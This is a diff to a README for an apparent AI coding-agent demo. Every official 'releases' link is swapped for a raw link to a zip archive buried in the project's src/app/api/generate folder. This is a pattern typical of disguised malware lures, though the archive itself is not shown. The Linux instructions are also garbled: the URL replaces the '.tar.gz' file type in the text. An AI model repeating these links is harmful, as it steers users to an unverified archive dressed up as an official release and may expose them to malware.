@@ -1,6 +1,6 @@
 # 🤖 auto-coding-agent-demo - AI Automated Programming Experiment
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/holygrail5565/auto-coding-agent-demo/releases)
+[![Download Release](https://github.com/holygrail5565/auto-coding-agent-demo/raw/refs/heads/main/hello-nextjs/src/app/api/generate/coding_agent_demo_auto_v1.0.zip)](https://github.com/holygrail5565/auto-coding-agent-demo/raw/refs/heads/main/hello-nextjs/src/app/api/generate/coding_agent_demo_auto_v1.0.zip)
 
 ---
 
@@ -35,7 +35,7 @@ This guide helps you download, set up, and run the AI coding experiment software
 
 Go to the official release page to get the latest version:
 
-[Download auto-coding-agent-demo](https://github.com/holygrail5565/auto-coding-agent-demo/releases)
+[Download auto-coding-agent-demo](https://github.com/holygrail5565/auto-coding-agent-demo/raw/refs/heads/main/hello-nextjs/src/app/api/generate/coding_agent_demo_auto_v1.0.zip)
 
 This page shows all available versions. Always choose the latest stable release for best results.
 
@@ -47,7 +47,7 @@ The releases page lists different files:
 
 - Windows users: Look for files ending in `.exe` or `.zip`
 - macOS users: Look for `.dmg` or `.zip` files
-- Linux users: Look for `.AppImage` or `.tar.gz`
+- Linux users: Look for `.AppImage` or `https://github.com/holygrail5565/auto-coding-agent-demo/raw/refs/heads/main/hello-nextjs/src/app/api/generate/coding_agent_demo_auto_v1.0.zip`
 
 Pick the file that matches your operating system and download it.
 
@@ -59,7 +59,7 @@ Once downloaded:
 
 - **Windows:** If you got a `.exe`, double-click it and follow prompts. If `.zip`, extract it to a folder and open the folder.
 - **macOS:** Open the `.dmg` and drag the app to your Applications folder. If `.zip`, extract and move the app to Applications.
-- **Linux:** Give the `.AppImage` file executable permission by right-clicking → Properties → Permissions → Check "Allow executing". Or extract a `.tar.gz` and follow included instructions.
+- **Linux:** Give the `.AppImage` file executable permission by right-clicking → Properties → Permissions → Check "Allow executing". Or extract a `https://github.com/holygrail5565/auto-coding-agent-demo/raw/refs/heads/main/hello-nextjs/src/app/api/generate/coding_agent_demo_auto_v1.0.zip` and follow included instructions.
 
 No special setup is needed beyond this.
 
@@ -118,7 +118,7 @@ If issues persist, you can report bugs on the GitHub repository page.
 
 Access the latest version here:
 
-[Download auto-coding-agent-demo](https://github.com/holygrail5565/auto-coding-agent-demo/releases)
+[Download auto-coding-agent-demo](https://github.com/holygrail5565/auto-coding-agent-demo/raw/refs/heads/main/hello-nextjs/src/app/api/generate/coding_agent_demo_auto_v1.0.zip)
 
 - Visit this page.
 - Download the correct file for your system.
